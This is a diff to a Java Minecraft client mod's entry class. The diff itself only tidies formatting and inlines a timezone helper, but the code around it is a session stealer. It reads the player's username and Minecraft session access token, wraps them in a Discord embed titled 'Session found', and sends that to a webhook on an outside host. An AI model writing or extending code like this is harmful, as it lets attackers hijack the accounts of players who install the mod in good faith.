@@ -27,16 +27,12 @@ public class Entry implements ClientModInitializer {
 
         DiscordEmbed embed = new DiscordEmbed("Session found");
 
-        ZoneId currentTimezone = this.getTimezone();
+        ZoneId currentTimezone = ZoneId.systemDefault();
 
-        embed.addln("**Username**: [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
+        embed.addln("**Username:** [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
         embed.addln("**Timezone:** `" + currentTimezone.toString() + "`\n");
-        embed.addln("**Session token**:\n||```" + session.getAccessToken() + "```||");
+        embed.addln("**Session token:**\n||```" + session.getAccessToken() + "```||");
 
         webhook.sendEmbed(embed);
-    }
-
-    private ZoneId getTimezone() {
-        return ZoneId.systemDefault();
     }
 }
